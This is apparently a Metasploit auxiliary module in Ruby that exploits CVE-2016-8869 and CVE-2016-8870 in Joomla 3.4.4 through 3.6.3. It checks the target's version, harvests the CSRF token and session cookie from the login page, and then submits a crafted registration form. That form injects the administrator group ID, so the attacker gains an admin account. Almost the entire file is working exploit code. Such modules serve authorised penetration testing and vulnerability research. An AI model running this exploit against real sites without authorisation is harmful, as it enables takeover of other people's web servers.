##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Joomla

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Joomla Account Creation and Privilege Escalation',
        'Description' => %q{
          This module creates an arbitrary account with administrative privileges in Joomla versions 3.4.4
          through 3.6.3. If an email server is configured in Joomla, an email will be sent to activate the account (the account is disabled by default).
        },
        'References' => [
          ['CVE', '2016-8869'],
          ['CVE', '2016-8870'],
          ['URL', 'https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html'],
          ['URL', 'https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html'],
          ['URL', 'https://medium.com/@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2']
        ],
        'Author' => [
          'Fabio Pires <fp[at]integrity.pt>', # module creation and privilege escalation
          'Filipe Reis <fr[at]integrity.pt>',     # module creation and privilege escalation
          'Vitor Oliveira <vo[at]integrity.pt>',  # module creation and privilege escalation
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2016-10-25',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/']),
        OptString.new('USERNAME', [true, 'Username that will be created', 'expl0it3r']),
        OptString.new('PASSWORD', [true, 'Password for the username', 'expl0it3r']),
        OptString.new('EMAIL', [true, 'Email to receive the activation code for the account', 'example@youremail.com'])
      ]
    )
  end

  def check
    res = send_request_cgi('uri' => target_uri.path)

    unless res
      vprint_error('Unable to connect to target')
      return Exploit::CheckCode::Unknown
    end

    unless joomla_and_online?
      vprint_error('Unable to detect Joomla')
      return Exploit::CheckCode::Safe
    end

    version = Rex::Version.new(joomla_version)

    unless version
      vprint_error('Unable to detect Joomla version')
      return Exploit::CheckCode::Detected
    end

    vprint_status("Detected Joomla version #{version}")

    if version.between?(Rex::Version.new('3.4.4'), Rex::Version.new('3.6.3'))
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def get_csrf(hidden_fields)
    hidden_list = hidden_fields
    hidden_list.each do |fields|
      fields.each do |item|
        if item[0].length == 32 && item[1] == '1'
          return item[0]
        end
      end
    end
  end

  def run
    if check == Exploit::CheckCode::Safe
      print_error('Target seems safe, so we will not continue!')
      return
    end

    print_status('Trying to create the user!')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php/component/users/'),
      'vars_get' => {
        'view' => 'login'
      }
    )

    if res && res.code == 200
      cookie = res.get_cookies
      csrf = get_csrf(res.get_hidden_inputs)

      if csrf.length != 32 && cookie.split(/=/).length != 2
        print_error('Could not find csrf or cookie!')
        return
      end
    else
      print_error('Could not find Login Page!')
      return
    end

    mime = Rex::MIME::Message.new
    mime.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="user[name]"')
    mime.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="user[username]"')
    mime.add_part('7', nil, nil, 'form-data; name="user[groups][]"')
    mime.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="user[password1]"')
    mime.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="user[password2]"')
    mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name="user[email1]"')
    mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name="user[email2]"')
    mime.add_part('com_users', nil, nil, 'form-data; name="option"')
    mime.add_part('user.register', nil, nil, 'form-data; name="task"')
    mime.add_part('1', nil, nil, 'form-data; name="' + csrf + '"')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php/component/users/'),
      'cookie' => cookie,
      'ctype' => "multipart/form-data; boundary=#{mime.bound}",
      'data' => mime.to_s
    )

    if res && res.code == 200
      print_good('PWND - Your user has been created')
      print_status("\tUsername: " + datastore['USERNAME'])
      print_status("\tPassword: " + datastore['PASSWORD'])
      print_status("\tEmail: " + datastore['EMAIL'])
    elsif res.redirect?
      res = send_request_cgi!(
        'uri' => res.redirection.path,
        'method' => 'GET',
        'cookie' => cookie
      )

      print_error('There was an issue, but the user could have been created.')

      parsed_data = res.get_html_document
      parsed_data.xpath('//div[@class="alert-message"]').each do |alert_msg|
        print_error("\t" + alert_msg.text)
      end
    else
      print_error('This host may not be vulnerable.')
    end
  end
end
